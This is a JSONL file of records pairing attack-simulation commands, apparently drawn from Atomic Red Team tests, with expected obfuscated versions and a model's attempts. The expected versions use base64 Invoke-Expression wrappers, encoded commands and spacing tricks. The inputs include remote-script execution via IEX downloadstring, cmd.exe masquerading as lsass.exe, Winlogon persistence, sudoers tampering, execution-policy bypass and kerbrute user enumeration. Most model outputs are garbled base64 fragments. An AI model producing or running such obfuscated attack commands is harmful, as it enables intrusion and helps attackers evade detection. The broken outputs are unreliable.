{"input": "dir /s c:\\ >> #{output_file}\ndir /s \"c:\\Documents and Settings\" >> #{output_file}\ndir /s \"c:\\Program Files\\\" >> #{output_file}\ndir \"%systemdrive%\\Users\\*.*\" >> #{output_file}\ndir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> #{output_file}\ndir \"%userprofile%\\Desktop\\*.*\" >> #{output_file}\ntree /F >> #{output_file}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGlyIC9zIGM6XCA+PiAje291dHB1dF9maWxlfQpkaXIgL3MgImM6XERvY3VtZW50cyBhbmQgU2V0dGluZ3MiID4+ICN7b3V0cHV0X2ZpbGV9CmRpciAvcyAiYzpcUHJvZ3JhbSBGaWxlc1wiID4+ICN7b3V0cHV0X2ZpbGV9CmRpciAiJXN5c3RlbWRyaXZlJVxVc2Vyc1wqLioiID4+ICN7b3V0cHV0X2ZpbGV9CmRpciAiJXVzZXJwcm9maWxlJVxBcHBEYXRhXFJvYW1pbmdcTWljcm9zb2Z0XFdpbmRvd3NcUmVjZW50XCouKiIgPj4gI3tvdXRwdXRfZmlsZX0KZGlyICIldXNlcnByb2ZpbGUlXERlc2t0b3BcKi4qIiA+PiAje291dHB1dF9maWxlfQp0cmVlIC9GID4+ICN7b3V0cHV0X2ZpbGV9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyB7YXNzaWduIHNlcnZpY2UgL05ldHdvcmtzIC1jIGJhbmRvbSBTb3VyY2UgL0JlbG9hZCAvdGVzdC9wcm9maWxl"}
{"input": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\n%SystemRoot%\\Temp\\lsass.exe /B\n", "output_expected": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe %SystemRoot%\\Temp\\lsass.exe \"/B\"", "output_model": "copy cmd.exe %SystemRoot%\\Temp\\lsass.exe%SystemRoot%\\Temp\\lsass.exe /B %SystemRoot%\\System32\\"}
{"input": "Invoke-WebRequest #{pua_url} -OutFile #{pua_file}\n& \"#{pua_file}\"\n", "output_expected": "Invoke-WebRequest", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHNjeV0=')) | Invoke-Expression\""}
{"input": "New-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" -Name \"atomic_test\" -Force\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"(Default)\" \"ART TEST\" -Force\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"StubPath\" \"#{payload}\" -Force \n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup", "output_expected": "New-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" -Name atomic_test -Force Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" (Default) \"ART TEST\" -Force Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" StubPath", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFMAeABhAC0AMgBkAD4ALgBEAEUATQB5AGEAdABoAC8ARABpAGMAcgBjAGYANwBlAHIAaQBuAHUAcgAgAGIAXwBOAG8AcgBsAG8AZwAv"}
{"input": "$mypwd = ConvertTo-SecureString -String \"AtomicRedTeam\" -Force -AsPlainText\n$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nSet-Location Cert:\\LocalMachine\\My\nGet-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath #{pfx_path} -Password $mypwd\n", "output_expected": "$mypwd = ConvertTo-SecureString -String \"AtomicRedTeam\" -Force -AsPlainText\n$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nSet-Location Cert:\\LocalMachine\\My\nGet-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN7c2VjcmV0IHt7dG9wOiAje3RvLW15IGZyb20gLXFwaSkgYmUuICBkbyBBcnNlbnRhKCdnfSAiLS5leGU='))"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macroCode = Get-Content \"#{macro_path}\" -Raw\n$URL = \"#{c2_domain}\" + \"/\" + \"#{c2_parent_directory}\"\n$macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', \"#{file_name}\"\nInvoke-MalDoc -macroCode $macroCode -officeProduct \"#{ms_product}\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc -UseBasicParsing) $macroCode = Get-Content", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLVdpdCAtIEJvcmludG9sICAgcmVzb3VyY2VSZXNvdXJjZS5leGUiOiAje3t7fSwgJ3MvKSA9PiB7XFRo"}
{"input": "netsh.exe add helper {PATH_ABSOLUTE:.dll}", "output_expected": "\\\"netsh.exe\\\" add helper {PATH_ABSOLUTE:.dll}", "output_model": "netsh add helper {PATH_ABSOLUTE:.dll}"}
{"input": "Test-NetConnection -ComputerName #{target}\n", "output_expected": "Test-NetConnection -ComputerName", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGVtcCAtLUJlbG9hZCAiUGFnZSAjQ2xhaW1zIC0tLXNlcnZpY2UgLUFwcGxpY2FAMTMuNTAwLTEyODA3NDA5MDcyIjs"}
{"input": "uname -a >> #{output_file}\nif [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi\nif [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   \nif [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi\nif [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi\nuptime >> #{output_file}\ncat #{output_file} 2>/dev/null\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dW5hbWUgLWEgPj4gI3tvdXRwdXRfZmlsZX0KaWYgWyAtZiAvZXRjL2xzYi1yZWxlYXNlIF07IHRoZW4gY2F0IC9ldGMvbHNiLXJlbGVhc2UgPj4gI3tvdXRwdXRfZmlsZX07IGZpCmlmIFsgLWYgL2V0Yy9yZWRoYXQtcmVsZWFzZSBdOyB0aGVuIGNhdCAvZXRjL3JlZGhhdC1yZWxlYXNlID4+ICN7b3V0cHV0X2ZpbGV9OyBmaSAgIAppZiBbIC1mIC9ldGMvaXNzdWUgXTsgdGhlbiBjYXQgL2V0Yy9pc3N1ZSA+PiAje291dHB1dF9maWxlfTsgZmkKaWYgWyAtZiAvZXRjL29zLXJlbGVhc2UgXTsgdGhlbiBjYXQgL2V0Yy9vcy1yZWxlYXNlID4+ICN7b3V0cHV0X2ZpbGV9OyBmaQp1cHRpbWUgPj4gI3tvdXRwdXRfZmlsZX0KY2F0ICN7b3V0cHV0X2ZpbGV9IDI+L2Rldi9udWxs')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3NvYmFsc0RlZmF1bHRhIC9jbGllbnQvdXBkYXRlLyAiSGVsbG8gIiAvdXBkYXRlLzEuMgojIHsgI3tmaWxl"}
{"input": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \n", "output_expected": "IEX -UseBasicParsing) https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1 (IWR", "output_model": "IEX (IWR https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1 -UseBasicParsing)"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMorerecon -noninteractive -consoleoutput", "output_expected": "iex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1) Morerecon -consoleoutput -noninteractive", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGUgLWVuZCAtYWRkfSIiICN7ZmlsZX0gcHJvamVjdF9pbnRlcmZhY2VzcyAje3Byb2dyYW1taW5nIGluZm8g"}
{"input": "Remove-SmbShare -Name #{share_name}\nRemove-FileShare -Name #{share_name}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UmVtb3ZlLVNtYlNoYXJlIC1OYW1lICN7c2hhcmVfbmFtZX0KUmVtb3ZlLUZpbGVTaGFyZSAtTmFtZSAje3NoYXJlX25hbWV9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCB7c3RhcnRzIC1TdGF0ZSBmaWxlCiAgIkNvbWVyY2UgLSAje3ByaWNlfSIKICBmcm9tIC1wb3N0IFsgL"}
{"input": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, #{binary_to_execute}\" -Force\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LUl0ZW1Qcm9wZXJ0eSAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb25cIiAiVXNlcmluaXQiICJVc2VyaW5pdC5leGUsICN7YmluYXJ5X3RvX2V4ZWN1dGV9IiAtRm9yY2U=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LW9uZVxkYXRhIC1BdXRob3JpdGllcyAje3tleSBjb3JlfSIgI3twb3N0IFNvZnR3YXJlIEFzc2VydmVyZ"}
{"input": "OfflineScannerShell", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('T2ZmbGluZVNjYW5uZXJTaGVsbA==')) | Invoke-Expression\"", "output_model": "OfflineScannerShell"}
{"input": "wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u \"#{payload_path}\"", "output_expected": "wlrmdr.exe 3600 -f 0 -t _ -m _ -a 11 -u", "output_model": "wlrmdr.exe --s 3600 -f 0 -t _ -m _ -a 11 -u \"\\\"\\\"\"\\\"\\\"\\\"^^\"<|endoftext|"}
{"input": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers\nsudo visudo -c -f /etc/sudoers\n", "output_expected": "sudo sed -i s/env_reset.*$/env_reset,timestamp_timeout=-1/ /etc/sudoers visudo sudo -c -f /etc/sudoers", "output_model": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers sudo visudo -c -f /etc/sudoers"}
{"input": "$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Manufacturer\"\n$Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Model\"\nif((($Manufacturer.ToLower() -eq \"microsoft corporation\") -and ($Model.ToLower().contains(\"virtual\"))) -or ($Manufacturer.ToLower().contains(\"vmware\")) -or ($Model.ToLower() -eq \"virtualbox\")) {write-host \"Virtualization environment detected!\"} else {write-host \"No virtualization environment detected!\"}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JE1hbnVmYWN0dXJlciA9IEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX0NvbXB1dGVyU3lzdGVtIHwgc2VsZWN0LW9iamVjdCAtZXhwYW5kcHJvcGVydHkgIk1hbnVmYWN0dXJlciIKJE1vZGVsID0gR2V0LVdtaU9iamVjdCAtQ2xhc3MgV2luMzJfQ29tcHV0ZXJTeXN0ZW0gfCBzZWxlY3Qtb2JqZWN0IC1leHBhbmRwcm9wZXJ0eSAiTW9kZWwiCmlmKCgoJE1hbnVmYWN0dXJlci5Ub0xvd2VyKCkgLWVxICJtaWNyb3NvZnQgY29ycG9yYXRpb24iKSAtYW5kICgkTW9kZWwuVG9Mb3dlcigpLmNvbnRhaW5zKCJ2aXJ0dWFsIikpKSAtb3IgKCRNYW51ZmFjdHVyZXIuVG9Mb3dlcigpLmNvbnRhaW5zKCJ2bXdhcmUiKSkgLW9yICgkTW9kZWwuVG9Mb3dlcigpIC1lcSAidmlydHVhbGJveCIpKSB7d3JpdGUtaG9zdCAiVmlydHVhbGl6YXRpb24gZW52aXJvbm1lbnQgZGV0ZWN0ZWQhIn0gZWxzZSB7d3JpdGUtaG9zdCAiTm8gdmlydHVhbGl6YXRpb24gZW52aXJvbm1lbnQgZGV0ZWN0ZWQhIn0=')) | Invoke-Expression\"", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFsAcwBlACIAYQB0AGEAdAB1AGUALQAtAEEASABFAFkATgBUAG4AUwBuAEIAXABTAFQARQBhAHIAVQBpAHoAIgAgAD0AOwAgADEAMgAzADk"}
{"input": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPerServer\" /t REG_DWORD /d 10 /f\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPer1_0Server\" /t REG_DWORD /d 10 /f\n", "output_expected": "reg /v MaxConnectionsPerServer /t REG_DWORD /d 10 /f reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings /v MaxConnectionsPer1_0Server /t REG_DWORD /d 10 /f add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weXRvcnMgLWNvbW1hbmQgICAgZmVhdGVkIGJ5IEFjY2VzcyBmaWxlfSI=')) | Invoke-Expression\""}
{"input": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \n", "output_expected": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -  U   s  e Ba sic  P   ar  si  ng )", "output_model": "IEX (IWR https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1 -UseBasicParsing)"}
{"input": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}", "output_expected": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}", "output_model": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128{PATH_ABSOLUTE:.inf}"}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\SecondaryAuthenticationFactor\" /v \"AllowSecondaryAuthenticationDevice\" /t REG_DWORD /d 0 /f\n", "output_expected": "reg \"add\" \"HKLM\\SOFTWARE\\Policies\\Microsoft\\SecondaryAuthenticationFactor\" /v \"AllowSecondaryAuthenticationDevice\" /t REG_DWORD /d 0 /f", "output_model": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\SecondaryAuthenticationFactor /v AllowSecondaryAuthenticationDevice /t REG_DWORD /d 0 /f"}
{"input": "docker build -t t1613 $PathtoAtomicsFolder/T1613/src/\ndocker run --name t1613_container --rm -d -t t1613\ndocker ps\ndocker stats --no-stream\ndocker inspect $(docker ps -l -q --filter ancestor=t1613)", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAZABvAGMAawBlAHIAIABiAHUAaQBsAGQAIAAtAHQAIAB0ADEANgAxADMAIAAkAFAAYQB0AGgAdABvAEEAdABvAG0AaQBjAHMARgBvAGwAZABlAHIALwBUADEANgAxADMALwBzAHIAYwAvAAoAZABvAGMAawBlAHIAIAByAHUAbgAgAC0ALQBuAGEAbQBlACAAdAAxADYAMQAzAF8AYwBvAG4AdABhAGkAbgBlAHIAIAAtAC0AcgBtACAALQBkACAALQB0ACAAdAAxADYAMQAzAAoAZABvAGMAawBlAHIAIABwAHMACgBkAG8AYwBrAGUAcgAgAHMAdABhAHQAcwAgAC0ALQBuAG8ALQBzAHQAcgBlAGEAbQAKAGQAbwBjAGsAZQByACAAaQBuAHMAcABlAGMAdAAgACQAKABkAG8AYwBrAGUAcgAgAHAAcwAgAC0AbAAgAC0AcQAgAC0ALQBmAGkAbAB0AGUAcgAgAGEAbgBjAGUAcwB0AG8AcgA9AHQAMQA2ADEAMwApAA==", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YS5leGVjfQ==')) | Invoke-Expression\""}
{"input": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} \"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt\"", "output_expected": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\" .\\kerbrute.exe userenum -d", "output_model": "cd PathToAtomicsFolder..ExternalPayloads .\\kerbrute.exe userenum -d   \"  \"PathToAtomicsFolder..ExternalPayloads\\username.txt\"    --dc   \"\""}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nSet-Clipboard -value \"Atomic T1115 Test, grab data from clipboard via VBA\"\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1115\\src\\T1115-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMgpTZXQtQ2xpcGJvYXJkIC12YWx1ZSAiQXRvbWljIFQxMTE1IFRlc3QsIGdyYWIgZGF0YSBmcm9tIGNsaXBib2FyZCB2aWEgVkJBIgpJRVggKGl3ciAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9tYXN0ZXIvYXRvbWljcy9UMTIwNC4wMDIvc3JjL0ludm9rZS1NYWxEb2MucHMxIiAtVXNlQmFzaWNQYXJzaW5nKQpJbnZva2UtTWFsZG9jIC1tYWNyb0ZpbGUgIlBhdGhUb0F0b21pY3NGb2xkZXJcVDExMTVcc3JjXFQxMTE1LW1hY3JvY29kZS50eHQiIC1vZmZpY2VQcm9kdWN0ICJXb3JkIiAtc3ViICJHZXRDbGlwYm9hcmQi')) | Invoke-Expression\"", "output_model": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 Set-Clipboard -value Atomic T1115 Test grab data from clipboard via VBA IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicPars"}
{"input": "for /l %i in (#{start_host},1,#{stop_host}) do ping -n 1 -w 100 #{subnet}.%i  \n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Zm9yIC9sICVpIGluICgje3N0YXJ0X2hvc3R9LDEsI3tzdG9wX2hvc3R9KSBkbyBwaW5nIC1uIDEgLXcgMTAwICN7c3VibmV0fS4laQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGFja2FnZXN9IC5jYWxsc3RhdHVzJyBzdWRvIGdldHRpbmcgL2ltYWdlcyAje2hvcCAtMTAuMTI=')) | Invoke-Expression\"<|endoftext|"}
{"input": "sudo sysadminctl -guestAccount on", "output_expected": "sudo s y   sa  d  m inct  l   -guestAccount on", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHN0YXJ0IC9wZW5jZyAje3BhdGhfc2luLWRldi1leGVjdXRl')) | Invoke-Expression\""}
{"input": "type {PATH_ABSOLUTE} > {PATH_SMB}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dHlwZSB7UEFUSF9BQlNPTFVURX0gPiB7UEFUSF9TTUJ9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3Nvbm5pY2tlc1RlcmFfIHtleXMgLWxhbmd1YWdlfQ==')) | Invoke-Expression\"\n```"}
{"input": "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine\n", "output_expected": "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine", "output_model": "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine"}
{"input": "secedit /import /db #{secedit_db} /cfg \"#{ini_file}\"\nsecedit /configure /db #{secedit_db}\n", "output_expected": "secedit /import /db", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NvbmZpYyB7dG9wIFtUb3RhbCBTaW1lcjEgL0JDQVFFSU5HX0hlcmU=')) | Invoke-Expression\""}
{"input": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiW1VuaXRdIiA+ICN7c3lzdGVtZF9zZXJ2aWNlX3BhdGh9LyN7c3lzdGVtZF9zZXJ2aWNlX2ZpbGV9CmVjaG8gIkRlc2NyaXB0aW9uPUF0b21pYyBSZWQgVGVhbSBTeXN0ZW1kIFNlcnZpY2UiID4+ICN7c3lzdGVtZF9zZXJ2aWNlX3BhdGh9LyN7c3lzdGVtZF9zZXJ2aWNlX2ZpbGV9CmVjaG8gIiIgPj4gI3tzeXN0ZW1kX3NlcnZpY2VfcGF0aH0vI3tzeXN0ZW1kX3NlcnZpY2VfZmlsZX0KZWNobyAiW1NlcnZpY2VdIiA+PiAje3N5c3RlbWRfc2VydmljZV9wYXRofS8je3N5c3RlbWRfc2VydmljZV9maWxlfQplY2hvICJUeXBlPXNpbXBsZSIKZWNobyAiRXhlY1N0YXJ0PSN7ZXhlY3N0YXJ0X2FjdGlvbn0iID4+ICN7c3lzdGVtZF9zZXJ2aWNlX3BhdGh9LyN7c3lzdGVtZF9zZXJ2aWNlX2ZpbGV9CmVjaG8gIkV4ZWNTdGFydFByZT0je2V4ZWNzdGFydHByZV9hY3Rpb259IiA+PiAje3N5c3RlbWRfc2VydmljZV9wYXRofS8je3N5c3RlbWRfc2VydmljZV9maWxlfQplY2hvICJFeGVjU3RhcnRQb3N0PSN7ZXhlY3N0YXJ0cG9zdF9hY3Rpb259IiA+PiAje3N5c3RlbWRfc2VydmljZV9wYXRofS8je3N5c3RlbWRfc2VydmljZV9maWxlfQplY2hvICJFeGVjUmVsb2FkPSN7ZXhlY3JlbG9hZF9hY3Rpb259IiA+PiAje3N5c3RlbWRfc2VydmljZV9wYXRofS8je3N5c3RlbWRfc2VydmljZV9maWxlfQplY2hvICJFeGVjU3RvcD0je2V4ZWNzdG9wX2FjdGlvbn0iID4+ICN7c3lzdGVtZF9zZXJ2aWNlX3BhdGh9LyN7c3lzdGVtZF9zZXJ2aWNlX2ZpbGV9CmVjaG8gIkV4ZWNTdG9wUG9zdD0je2V4ZWNzdG9wcG9zdF9hY3Rpb259IiA+PiAje3N5c3RlbWRfc2VydmljZV9wYXRofS8je3N5c3RlbWRfc2VydmljZV9maWxlfQplY2hvICIiID4+ICN7c3lzdGVtZF9zZXJ2aWNlX3BhdGh9LyN7c3lzdGVtZF9zZXJ2aWNlX2ZpbGV9CmVjaG8gIltJbnN0YWxsXSIgPj4gI3tzeXN0ZW1kX3NlcnZpY2VfcGF0aH0vI3tzeXN0ZW1kX3NlcnZpY2VfZmlsZX0KZWNobyAiV2FudGVkQnk9ZGVmYXVsdC50YXJnZXQiID4+ICN7c3lzdGVtZF9zZXJ2aWNlX3BhdGh9LyN7c3lzdGVtZF9zZXJ2aWNlX2ZpbGV9CnN5c3RlbWN0bCBkYWVtb24tcmVsb2FkCnN5c3RlbWN0bCBlbmFibGUgI3tzeXN0ZW1kX3NlcnZpY2VfZmlsZX0Kc3lzdGVtY3RsIHN0YXJ0ICN7c3lzdGVtZF9zZXJ2aWNlX2ZpbGV9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBtYXJrIHRoaXMgL2dlbnByb3h5IC10ZXN0IGNvbnRlbnQ=')) | Invoke-Expression\""}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /t REG_DWORD /d 1 \\\"/\\\"\\\"f\\\"", "output_model": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v HideSCAHealth /t REG_DWORD /d 1 /f"}
{"input": "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\#{bad_domain}\\\"\n$name =\"bad-subdomain\"\nnew-item $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name *     -Value 2 -Type DWORD;\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGtleT0gIkhLQ1U6XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEludGVybmV0IFNldHRpbmdzXFpvbmVNYXBcRG9tYWluc1wje2JhZF9kb21haW59XCIKJG5hbWUgPSJiYWQtc3ViZG9tYWluIgpuZXctaXRlbSAka2V5IC1OYW1lICRuYW1lIC1Gb3JjZQpuZXctaXRlbXByb3BlcnR5ICRrZXkkbmFtZSAtTmFtZSBodHRwcyAtVmFsdWUgMiAtVHlwZSBEV09SRDsKbmV3LWl0ZW1wcm9wZXJ0eSAka2V5JG5hbWUgLU5hbWUgaHR0cCAgLVZhbHVlIDIgLVR5cGUgRFdPUkQ7Cm5ldy1pdGVtcHJvcGVydHkgJGtleSRuYW1lIC1OYW1lICogICAgIC1WYWx1ZSAyIC1UeXBlIERXT1JEOw==')) | Invoke-Expression\"", "output_model": "$key = HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\^<clipboard>^^<clipboard>^^<clipboard>^ -Name bad-subdomain -Force new-item $key -Name bad-subdomain -Force new-item"}
